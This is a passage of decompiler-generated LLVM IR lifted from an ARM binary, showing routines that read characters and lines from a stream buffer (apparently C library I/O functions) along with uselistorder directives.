  %v3_15168 = zext i16 %v2_15168 to i32
  %v1_1516c = and i32 %v3_15168, 64
  store i32 %v1_1516c, i32* %r3.global-to-local, align 4
  %v2_1516c = icmp eq i32 %v1_1516c, 0
  br i1 %v2_1516c, label %bb51, label %dec_label_pc_15178

bb51:                                             ; preds = %dec_label_pc_15168
  br label %bb52

dec_label_pc_15178:                               ; preds = %dec_label_pc_15168
  %v1_15178 = call i32 @function_14c74(i32 %v0_15178)
  store i32 %v1_15178, i32* %r0.global-to-local, align 4
  %v2_1517c = icmp eq i32 %v1_15178, 0
  br i1 %v2_1517c, label %.thread24, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_15178
  br label %bb52

.thread24:                                        ; preds = %dec_label_pc_15178
  %v1_15180 = load i32, i32* %fp.global-to-local, align 4
  %v2_15180 = inttoptr i32 %v1_15180 to i16*
  %v3_15180 = load i16, i16* %v2_15180, align 2
  %v4_15180 = zext i16 %v3_15180 to i32
  store i32 %v4_15180, i32* %r3.global-to-local, align 4
  %v2_15184 = add i32 %v1_15180, 8
  %v3_15184 = inttoptr i32 %v2_15184 to i32*
  %v4_15184 = load i32, i32* %v3_15184, align 4
  store i32 %v4_15184, i32* %r2.global-to-local, align 4
  %v2_15188 = and i32 %v4_15180, 65471
  store i32 %v2_15188, i32* %r3.global-to-local, align 4
  %v2_1518c = trunc i32 %v2_15188 to i16
  store i16 %v2_1518c, i16* %v2_15180, align 2
  %v1_15190 = load i32, i32* %r2.global-to-local, align 4
  %v2_15190 = load i32, i32* %fp.global-to-local, align 4
  %v3_15190 = add i32 %v2_15190, 28
  %v4_15190 = inttoptr i32 %v3_15190 to i32*
  store i32 %v1_15190, i32* %v4_15190, align 4
  br label %bb52

bb52:                                             ; preds = %bb51, %.thread26, %dec_label_pc_15160, %.thread24
  %v0_1519c = phi i32 [ -1, %.thread26 ], [ 0, %bb51 ], [ %v0_1519c.pre, %dec_label_pc_15160 ], [ 0, %.thread24 ]
  store i32 %v0_1519c, i32* %r0.global-to-local, align 4
  %v2_151a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_151a4, i32* %r4.global-to-local, align 4
  ret i32 %v0_1519c

; uselistorder directives
  uselistorder i32 %v0_1519c, { 1, 0 }
  uselistorder i32 %v3_15154, { 1, 2, 0 }
  uselistorder i32 %v0_15104, { 1, 0, 2 }
  uselistorder i32 %v0_15044, { 1, 0, 2 }
  uselistorder i32 %v0_15178, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 6, 5, 16, 7, 9, 8, 10, 12, 11, 13, 14, 15, 2, 0, 1 }
  uselistorder i32* %fp.global-to-local, { 3, 4, 0, 1, 5, 2, 6 }
  uselistorder i32 ()* @function_14e3c, { 1, 0 }
  uselistorder i32 56, { 8, 9, 10, 1, 2, 11, 13, 4, 5, 6, 7, 0, 3, 12, 14 }
  uselistorder i32* @r8, { 7, 8, 9, 10, 11, 12, 13, 14, 1, 15, 202, 152, 153, 2, 154, 155, 156, 180, 181, 182, 183, 184, 6, 185, 186, 187, 188, 189, 190, 191, 192, 61, 62, 63, 64, 65, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 16, 31, 32, 33, 34, 17, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 3, 58, 59, 60, 66, 67, 68, 69, 70, 71, 72, 73, 74, 80, 4, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 5, 148, 149, 150, 151, 193, 194, 0, 195, 196, 197, 198, 199, 200, 201, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 75, 76, 77, 78, 79 }
  uselistorder i32 96, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11 }
  uselistorder i32* inttoptr (i32 124876 to i32*), { 0, 1, 2, 3, 4, 5, 6, 7, 10, 8, 9 }
  uselistorder i32 72, { 0, 1, 2, 3, 4, 5, 15, 11, 12, 13, 14, 6, 16, 7, 8, 9, 10 }
  uselistorder label %bb52, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_15154, { 1, 0 }
  uselistorder label %bb50, { 2, 0, 1 }
  uselistorder label %dec_label_pc_150cc, { 1, 0 }
  uselistorder label %dec_label_pc_15000, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
}

define i32 @function_151b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_151b0:
  %v0_151b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_151b0, label %bb, label %.thread6

bb:                                               ; preds = %dec_label_pc_151b0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_151b0, %bb
  %v5_151cc = phi i32 [ %arg1, %dec_label_pc_151b0 ], [ 0, %bb ]
  ret i32 %v5_151cc

; uselistorder directives
  uselistorder label %.thread6, { 1, 0 }
}

define i32 @function_151d0(i16* %arg1) local_unnamed_addr {
dec_label_pc_151d0:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-17 = alloca i8, align 1
  %stack_var_-12 = alloca i32, align 4
  %v3_151d0 = load i32, i32* @r4, align 4
  store i32 %v3_151d0, i32* %stack_var_-12, align 4
  %v6_151d0 = load i32, i32* @r5, align 4
  %v9_151d0 = load i32, i32* @lr, align 4
  %v0_151d4 = load i32, i32* @r0, align 4
  %v1_151d4 = add i32 %v0_151d4, 16
  %v2_151d4 = inttoptr i32 %v1_151d4 to i32*
  %v3_151d4 = load i32, i32* %v2_151d4, align 4
  store i32 %v3_151d4, i32* %r2.global-to-local, align 4
  %v1_151d8 = add i32 %v0_151d4, 24
  %v2_151d8 = inttoptr i32 %v1_151d8 to i32*
  %v3_151d8 = load i32, i32* %v2_151d8, align 4
  %v3_151dc = icmp ult i32 %v3_151d4, %v3_151d8
  store i32 %v0_151d4, i32* @r4, align 4
  br i1 %v3_151dc, label %bb, label %dec_label_pc_151fc

bb:                                               ; preds = %dec_label_pc_151d0
  %v2_151e8 = inttoptr i32 %v3_151d4 to i8*
  %v3_151e8 = load i8, i8* %v2_151e8, align 1
  %v4_151e8 = zext i8 %v3_151e8 to i32
  store i32 %v4_151e8, i32* %r0.global-to-local, align 4
  %v6_151e8 = add i32 %v3_151d4, 1
  store i32 %v6_151e8, i32* %r2.global-to-local, align 4
  store i32 %v6_151e8, i32* %v2_151d4, align 4
  br label %dec_label_pc_152e8

dec_label_pc_151fc:                               ; preds = %dec_label_pc_151d0
  store i32 124804, i32* @r5, align 4
  %v1_151fc = inttoptr i32 %v0_151d4 to i16*
  %v2_151fc = load i16, i16* %v1_151fc, align 2
  %v3_151fc = zext i16 %v2_151fc to i32
  %v1_15200 = and i32 %v3_151fc, 131
  %tmp24 = icmp ugt i32 %v1_15200, 128
  br i1 %tmp24, label %dec_label_pc_1521c, label %dec_label_pc_1520c

dec_label_pc_1520c:                               ; preds = %dec_label_pc_151fc
  store i32 128, i32* @r1, align 4
  %v0_15210 = call i32 @function_1603c()
  store i32 %v0_15210, i32* %r0.global-to-local, align 4
  %v2_15214 = icmp eq i32 %v0_15210, 0
  br i1 %v2_15214, label %dec_label_pc_1520c.dec_label_pc_1521c_crit_edge, label %dec_label_pc_152e4

dec_label_pc_1520c.dec_label_pc_1521c_crit_edge:  ; preds = %dec_label_pc_1520c
  %v0_1521c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1521c

dec_label_pc_1521c:                               ; preds = %dec_label_pc_1520c.dec_label_pc_1521c_crit_edge, %dec_label_pc_151fc
  %v2_1525c = phi i32 [ %v0_1521c.pre, %dec_label_pc_1520c.dec_label_pc_1521c_crit_edge ], [ %v0_151d4, %dec_label_pc_151fc ]
  %v1_1521c = inttoptr i32 %v2_1525c to i16*
  %v2_1521c = load i16, i16* %v1_1521c, align 2
  %v3_1521c = zext i16 %v2_1521c to i32
  store i32 %v3_1521c, i32* %r2.global-to-local, align 4
  %v1_15220 = and i32 %v3_1521c, 2
  %v2_15220 = icmp eq i32 %v1_15220, 0
  br i1 %v2_15220, label %dec_label_pc_1524c, label %dec_label_pc_15228

dec_label_pc_15228:                               ; preds = %dec_label_pc_1521c
  %tmp25 = urem i16 %v2_1521c, 2
  %v1_15228 = zext i16 %tmp25 to i32
  %tmp21 = sub nsw i32 0, %v1_15228
  %v4_1522c = and i32 %tmp21, 4
  %v5_1522c = add i32 %v4_1522c, %v2_1525c
  %v1_15230 = add i32 %v5_1522c, 36
  %v2_15230 = inttoptr i32 %v1_15230 to i8*
  %v3_15230 = load i8, i8* %v2_15230, align 1
  %v4_15230 = zext i8 %v3_15230 to i32
  %v1_15234 = add nsw i32 %v3_1521c, -1
  store i32 %v1_15234, i32* %r2.global-to-local, align 4
  store i32 %v4_15230, i32* %r0.global-to-local, align 4
  %v2_15240 = add i32 %v2_1525c, 40
  %v3_15240 = inttoptr i32 %v2_15240 to i32*
  store i32 0, i32* %v3_15240, align 4
  %v0_15244 = load i32, i32* %r2.global-to-local, align 4
  %v1_15244 = trunc i32 %v0_15244 to i16
  %v2_15244 = load i32, i32* @r4, align 4
  %v3_15244 = inttoptr i32 %v2_15244 to i16*
  store i16 %v1_15244, i16* %v3_15244, align 2
  br label %dec_label_pc_152e8

dec_label_pc_1524c:                               ; preds = %dec_label_pc_1521c
  %v1_1524c = add i32 %v2_1525c, 16
  %v1_15250 = inttoptr i32 %v1_1524c to i32*
  %v2_15250 = load i32, i32* %v1_15250, align 4
  %v3_15250 = add i32 %v2_1525c, 20
  %v4_15250 = inttoptr i32 %v3_15250 to i32*
  %v5_15250 = load i32, i32* %v4_15250, align 4
  %v9_15254 = icmp eq i32 %v5_15250, %v2_15250
  br i1 %v9_15254, label %dec_label_pc_15264, label %.thread5

.thread5:                                         ; preds = %dec_label_pc_1524c
  %v2_15258 = inttoptr i32 %v2_15250 to i8*
  %v3_15258 = load i8, i8* %v2_15258, align 1
  %v4_15258 = zext i8 %v3_15258 to i32
  store i32 %v4_15258, i32* %r0.global-to-local, align 4
  %v6_15258 = add i32 %v2_15250, 1
  store i32 %v6_15258, i32* %v1_15250, align 4
  br label %dec_label_pc_152e8

dec_label_pc_15264:                               ; preds = %dec_label_pc_1524c
  %v1_15264 = add i32 %v2_1525c, 4
  %v2_15264 = inttoptr i32 %v1_15264 to i32*
  %v3_15264 = load i32, i32* %v2_15264, align 4
  %v7_15268 = icmp eq i32 %v3_15264, -2
  br i1 %v7_15268, label %.thread8, label %dec_label_pc_1527c

.thread8:                                         ; preds = %dec_label_pc_15264
  %v2_1526c = or i16 %v2_1521c, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_1526c, i16* %v1_1521c, align 2
  br label %dec_label_pc_152e8

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15264
  %v1_1527c = and i32 %v3_1521c, 768
  %v2_1527c = icmp eq i32 %v1_1527c, 0
  br i1 %v2_1527c, label %.thread10, label %bb22

bb22:                                             ; preds = %dec_label_pc_1527c
  %v1_15284 = load i32, i32* @r5, align 4
  %v3_15284 = add i32 %v1_15284, 44
  %v4_15284 = inttoptr i32 %v3_15284 to i32*
  %v5_15284 = load i32, i32* %v4_15284, align 4
  store i32 %v5_15284, i32* %r0.global-to-local, align 4
  br label %.thread10

.thread10:                                        ; preds = %dec_label_pc_1527c, %bb22
  %v1_15288 = xor i1 %v2_1527c, true
  call void @__pseudo_cond_branch(i1 %v1_15288, i32 ptrtoint (i32* @global_var_14fc4.505 to i32))
  %v0_1528c = load i32, i32* @r4, align 4
  %v1_1528c = add i32 %v0_1528c, 8
  store i32 %v1_1528c, i32* %r2.global-to-local, align 4
  %v1_15290 = inttoptr i32 %v1_1528c to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  store i32 %v2_15290, i32* %r2.global-to-local, align 4
  %v3_15290 = add i32 %v0_1528c, 12
  %v4_15290 = inttoptr i32 %v3_15290 to i32*
  %v5_15290 = load i32, i32* %v4_15290, align 4
  %v9_15294 = icmp eq i32 %v5_15290, %v2_15290
  br i1 %v9_15294, label %dec_label_pc_152c8, label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %.thread10
  %v2_1529c = add i32 %v0_1528c, 24
  %v3_1529c = inttoptr i32 %v2_1529c to i32*
  store i32 %v2_15290, i32* %v3_1529c, align 4
  %v0_152a0 = load i32, i32* @r4, align 4
  store i32 %v0_152a0, i32* %r0.global-to-local, align 4
  %v2_152a4 = call i32 @function_1600c(i32 %v0_152a0)
  store i32 %v2_152a4, i32* %r0.global-to-local, align 4
  %v2_152a8 = icmp eq i32 %v2_152a4, 0
  br i1 %v2_152a8, label %dec_label_pc_152e4, label %dec_label_pc_152b0

dec_label_pc_152b0:                               ; preds = %dec_label_pc_1529c
  %v0_152b0 = load i32, i32* @r4, align 4
  %v1_152b0 = add i32 %v0_152b0, 20
  %v2_152b0 = inttoptr i32 %v1_152b0 to i32*
  %v3_152b0 = load i32, i32* %v2_152b0, align 4
  %v2_152b4 = add i32 %v0_152b0, 24
  %v3_152b4 = inttoptr i32 %v2_152b4 to i32*
  store i32 %v3_152b0, i32* %v3_152b4, align 4
  %v0_152b8 = load i32, i32* @r4, align 4
  %v1_152b8 = add i32 %v0_152b8, 16
  %v2_152b8 = inttoptr i32 %v1_152b8 to i32*
  %v3_152b8 = load i32, i32* %v2_152b8, align 4
  %v1_152bc = inttoptr i32 %v3_152b8 to i8*
  %v2_152bc = load i8, i8* %v1_152bc, align 1
  %v3_152bc = zext i8 %v2_152bc to i32
  store i32 %v3_152bc, i32* %r0.global-to-local, align 4
  %v5_152bc = add i32 %v3_152b8, 1
  store i32 %v5_152bc, i32* %v2_152b8, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152c8:                               ; preds = %.thread10
  %v1_152c8 = inttoptr i32 %v0_1528c to i16*
  store i32 %v0_1528c, i32* %r0.global-to-local, align 4
  %v2_152cc = ptrtoint i8* %stack_var_-17 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_152d4 = call i32 @function_15f00(i16* %v1_152c8, i32 %v2_152cc, i32 1)
  store i32 %v5_152d4, i32* %r0.global-to-local, align 4
  %v2_152d8 = icmp eq i32 %v5_152d4, 0
  br i1 %v2_152d8, label %dec_label_pc_152e4, label %bb23

bb23:                                             ; preds = %dec_label_pc_152c8
  %v4_152dc = load i8, i8* %stack_var_-17, align 1
  %v5_152dc = sext i8 %v4_152dc to i32
  store i32 %v5_152dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152e4:                               ; preds = %dec_label_pc_152c8, %dec_label_pc_1520c, %dec_label_pc_1529c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_152e8

dec_label_pc_152e8:                               ; preds = %bb, %.thread8, %bb23, %.thread5, %dec_label_pc_152b0, %dec_label_pc_15228, %dec_label_pc_152e4
  %v2_152ec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_152ec, i32* @r4, align 4
  store i32 %v6_151d0, i32* @r5, align 4
  store i32 %v9_151d0, i32* @lr, align 4
  %v1_152f0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_152f0

; uselistorder directives
  uselistorder i32 %v2_15250, { 1, 0, 2 }
  uselistorder i32 %v2_1525c, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_151d4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_151d4, { 1, 0, 2, 3, 4 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 11, 1, 0, 4, 3, 2, 10, 5, 6, 7, 8, 9, 13, 12 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder i32 128, { 5, 0, 4, 6, 1, 7, 8, 9, 2, 3, 10, 11, 12 }
  uselistorder label %dec_label_pc_152e8, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_152e4, { 0, 2, 1 }
  uselistorder label %.thread10, { 1, 0 }
}

define i32 @function_152fc(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_152fc:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v6_152fc = load i32, i32* @r5, align 4
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15300 = icmp eq i32 %arg2, 0
  store i1 %v2_15300, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_15388, label %dec_label_pc_15370.preheader

dec_label_pc_15370.preheader:                     ; preds = %dec_label_pc_152fc
  store i32 %tmp, i32* @r5, align 4
  %v1_153702 = add i32 %arg2, -1
  store i32 %v1_153702, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_153708 = icmp eq i32 %arg2, 1
  store i1 %v7_153708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_153708, label %dec_label_pc_15378, label %dec_label_pc_1531c

dec_label_pc_1531c:                               ; preds = %dec_label_pc_15370.preheader, %dec_label_pc_15370.backedge.dec_label_pc_1531c_crit_edge
  %v0_15340 = phi i32 [ %v0_1531c.pre, %dec_label_pc_15370.backedge.dec_label_pc_1531c_crit_edge ], [ %arg3, %dec_label_pc_15370.preheader ]
  %v1_1531c = add i32 %v0_15340, 16
  %v2_1531c = inttoptr i32 %v1_1531c to i32*
  %v3_1531c = load i32, i32* %v2_1531c, align 4
  store i32 %v3_1531c, i32* %r2.global-to-local, align 4
  %v1_15320 = add i32 %v0_15340, 24
  %v2_15320 = inttoptr i32 %v1_15320 to i32*
  %v3_15320 = load i32, i32* %v2_15320, align 4
  store i32 %v3_15320, i32* %r3.global-to-local, align 4
  %v3_15324 = icmp uge i32 %v3_1531c, %v3_15320
  store i1 %v3_15324, i1* %cpsr_c.global-to-local, align 1
  %v9_15324 = icmp eq i32 %v3_1531c, %v3_15320
  store i1 %v9_15324, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_15324, label %dec_label_pc_15340, label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %dec_label_pc_1531c
  %v1_1532c = inttoptr i32 %v3_1531c to i8*
  %v2_1532c = load i8, i8* %v1_1532c, align 1
  %v3_1532c = zext i8 %v2_1532c to i32
  store i32 %v3_1532c, i32* %r3.global-to-local, align 4
  %v5_1532c = add i32 %v3_1531c, 1
  store i32 %v5_1532c, i32* %r2.global-to-local, align 4
  %v2_15330 = load i32, i32* @r5, align 4
  %v3_15330 = inttoptr i32 %v2_15330 to i8*
  store i8 %v2_1532c, i8* %v3_15330, align 1
  %v4_15330 = load i32, i32* @r5, align 4
  %v5_15330 = add i32 %v4_15330, 1
  store i32 %v5_15330, i32* @r5, align 4
  %v0_15334 = load i32, i32* %r3.global-to-local, align 4
  %v2_15334 = icmp ugt i32 %v0_15334, 9
  store i1 %v2_15334, i1* %cpsr_c.global-to-local, align 1
  %v7_15334 = icmp eq i32 %v0_15334, 10
  store i1 %v7_15334, i1* %cpsr_z.global-to-local, align 1
  %v0_15338 = load i32, i32* %r2.global-to-local, align 4
  %v1_15338 = load i32, i32* @r4, align 4
  %v2_15338 = add i32 %v1_15338, 16
  %v3_15338 = inttoptr i32 %v2_15338 to i32*
  store i32 %v0_15338, i32* %v3_15338, align 4
  br i1 %v7_15334, label %dec_label_pc_15378, label %dec_label_pc_15370.backedge

dec_label_pc_15340:                               ; preds = %dec_label_pc_1531c
  %v1_15340 = inttoptr i32 %v0_15340 to i16*
  %v3_15344 = call i32 @function_151d0(i16* %v1_15340)
  %v3_15348 = icmp eq i32 %v3_15344, -1
  store i1 %v3_15348, i1* %cpsr_c.global-to-local, align 1
  %v8_15348 = icmp eq i32 %v3_15344, -1
  store i1 %v8_15348, i1* %cpsr_z.global-to-local, align 1
  %v1_1534c = urem i32 %v3_15344, 256
  store i32 %v1_1534c, i32* %r3.global-to-local, align 4
  br i1 %v3_15348, label %dec_label_pc_15354, label %dec_label_pc_1536c

dec_label_pc_15354:                               ; preds = %dec_label_pc_15340
  %v0_15354 = load i32, i32* @r4, align 4
  %v1_15354 = inttoptr i32 %v0_15354 to i16*
  %v2_15354 = load i16, i16* %v1_15354, align 2
  %v3_15354 = zext i16 %v2_15354 to i32
  store i32 %v3_15354, i32* %r3.global-to-local, align 4
  %v1_15358 = and i32 %v3_15354, 8
  %v2_15358 = icmp eq i32 %v1_15358, 0
  store i1 %v2_15358, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_15358, label %dec_label_pc_15378, label %dec_label_pc_15388

dec_label_pc_1536c:                               ; preds = %dec_label_pc_15340
  %v1_15364 = trunc i32 %v3_15344 to i8
  %v2_15364 = load i32, i32* @r5, align 4
  %v3_15364 = inttoptr i32 %v2_15364 to i8*
  store i8 %v1_15364, i8* %v3_15364, align 1
  %v4_15364 = load i32, i32* @r5, align 4
  %v5_15364 = add i32 %v4_15364, 1
  store i32 %v5_15364, i32* @r5, align 4
  %v0_15368 = load i32, i32* %r3.global-to-local, align 4
  %v2_15368 = icmp ugt i32 %v0_15368, 9
  store i1 %v2_15368, i1* %cpsr_c.global-to-local, align 1
  %v7_15368 = icmp eq i32 %v0_15368, 10
  store i1 %v7_15368, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15368, label %dec_label_pc_15378, label %dec_label_pc_15370.backedge

dec_label_pc_15370.backedge:                      ; preds = %dec_label_pc_1536c, %dec_label_pc_1532c
  %v0_15370 = load i32, i32* %r6.global-to-local, align 4
  %v1_15370 = add i32 %v0_15370, -1
  store i32 %v1_15370, i32* %r6.global-to-local, align 4
  %v2_15370 = icmp ne i32 %v0_15370, 0
  store i1 %v2_15370, i1* %cpsr_c.global-to-local, align 1
  %v7_15370 = icmp eq i32 %v0_15370, 1
  store i1 %v7_15370, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_15370, label %dec_label_pc_15378, label %dec_label_pc_15370.backedge.dec_label_pc_1531c_crit_edge

dec_label_pc_15370.backedge.dec_label_pc_1531c_crit_edge: ; preds = %dec_label_pc_15370.backedge
  %v0_1531c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1531c

dec_label_pc_15378:                               ; preds = %dec_label_pc_1536c, %dec_label_pc_15370.backedge, %dec_label_pc_1532c, %dec_label_pc_15370.preheader, %dec_label_pc_15354
  %v0_15378 = load i32, i32* @r5, align 4
  %v1_15378 = load i32, i32* @r7, align 4
  %v3_15378 = icmp uge i32 %v0_15378, %v1_15378
  store i1 %v3_15378, i1* %cpsr_c.global-to-local, align 1
  %v9_15378 = icmp eq i32 %v0_15378, %v1_15378
  store i1 %v9_15378, i1* %cpsr_z.global-to-local, align 1
  %v2_1537c = xor i1 %v9_15378, true
  %v3_1537c = and i1 %v3_15378, %v2_1537c
  br i1 %v3_1537c, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_15378
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_15380 = inttoptr i32 %v0_15378 to i8*
  store i8 0, i8* %v7_15380, align 1
  %v0_15384.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_15384.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_15378, %bb
  %v1_15384 = phi i1 [ %v1_15384.pre, %bb ], [ %v9_15378, %dec_label_pc_15378 ]
  %v0_15384 = phi i1 [ %v0_15384.pre, %bb ], [ %v3_15378, %dec_label_pc_15378 ]
  %v2_15384 = xor i1 %v1_15384, true
  %v3_15384 = and i1 %v0_15384, %v2_15384
  br i1 %v3_15384, label %.dec_label_pc_1538c_crit_edge, label %dec_label_pc_15388

.dec_label_pc_1538c_crit_edge:                    ; preds = %.thread14
  %v0_1538c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1538c

dec_label_pc_15388:                               ; preds = %dec_label_pc_152fc, %dec_label_pc_15354, %.thread14
  br label %dec_label_pc_1538c

dec_label_pc_1538c:                               ; preds = %.dec_label_pc_1538c_crit_edge, %dec_label_pc_15388
  %v0_1538c = phi i32 [ %v0_1538c.pre, %.dec_label_pc_1538c_crit_edge ], [ 0, %dec_label_pc_15388 ]
  store i32 %v6_152fc, i32* @r5, align 4
  ret i32 %v0_1538c

; uselistorder directives
  uselistorder i1 %v9_15378, { 1, 0, 2 }
  uselistorder i32 %v1_15378, { 1, 0 }
  uselistorder i32 %v0_15378, { 0, 2, 1 }
  uselistorder i32 %v0_15370, { 2, 0, 1 }
  uselistorder i32 %v0_15368, { 1, 0 }
  uselistorder i32 %v3_15344, { 2, 1, 0, 3 }
  uselistorder i32 %v0_15334, { 1, 0 }
  uselistorder i32 %v3_1531c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_15340, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 (i16*)* @function_151d0, { 0, 2, 3, 1 }
  uselistorder i1 true, { 0, 1, 69, 101, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 64, 28, 29, 30, 31, 32, 120, 62, 65, 71, 106, 74, 73, 33, 102, 87, 103, 104, 36, 105, 63, 72, 107, 108, 109, 110, 66, 111, 112, 113, 114, 115, 37, 38, 116, 117, 34, 35, 118, 119, 86, 85, 39, 40, 41, 121, 42, 43, 75, 76, 81, 77, 82, 78, 80, 122, 79, 84, 123, 44, 124, 45, 125, 88, 89, 126, 90, 91, 127, 92, 93, 46, 47, 128, 94, 95, 48, 49, 129, 96, 97, 50, 51, 130, 98, 99, 52, 53, 70, 131, 132, 83, 133, 54, 67, 55, 56, 68, 57, 58, 59, 60, 61, 100 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1538c, { 1, 0 }
  uselistorder label %dec_label_pc_15388, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_15378, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_1531c, { 1, 0 }
}

define i32 @function_153a0() local_unnamed_addr {
dec_label_pc_153a0:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_153a0 = load i32, i32* @r1, align 4
  %v1_153a0 = load i32, i32* @r0, align 4
  %v2_153a0 = sub i32 %v0_153a0, %v1_153a0
  %v3_153a0 = icmp ult i32 %v0_153a0, %v1_153a0
  %v4_153a0 = xor i32 %v1_153a0, %v0_153a0
  %v5_153a0 = xor i32 %v2_153a0, %v0_153a0
  %v6_153a0 = and i32 %v5_153a0, %v4_153a0
  %v7_153a0 = icmp slt i32 %v6_153a0, 0
  store i1 %v7_153a0, i1* %cpsr_v.global-to-local, align 1
  %v8_153a0 = icmp slt i32 %v2_153a0, 0
  store i1 %v8_153a0, i1* %cpsr_n.global-to-local, align 1
  %v9_153a0 = icmp eq i32 %v0_153a0, %v1_153a0
  store i1 %v9_153a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_153a0, label %dec_label_pc_155f4, label %dec_label_pc_153a8

dec_label_pc_153a8:                               ; preds = %dec_label_pc_153a0
  br i1 %v9_153a0, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_153a8
  %merge = phi i32 [ %v0_153a0, %dec_label_pc_153a8 ], [ %v2_15688, %bb150 ], [ %v11_156a4, %bb153 ], [ %v7_156a4, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_153a8
  %v5_153ac = inttoptr i32 %v1_153a0 to i8*
  store i8* %v5_153ac, i8** %stack_var_-8, align 4
  %v8_153ac = load i32, i32* @lr, align 4
  %v0_153b0 = load i32, i32* @r2, align 4
  %v2_153b0 = add i32 %v0_153b0, -4
  store i32 %v2_153b0, i32* %r2.global-to-local, align 4
  %v4_153b0 = sub i32 3, %v0_153b0
  %v5_153b0 = and i32 %v4_153b0, %v0_153b0
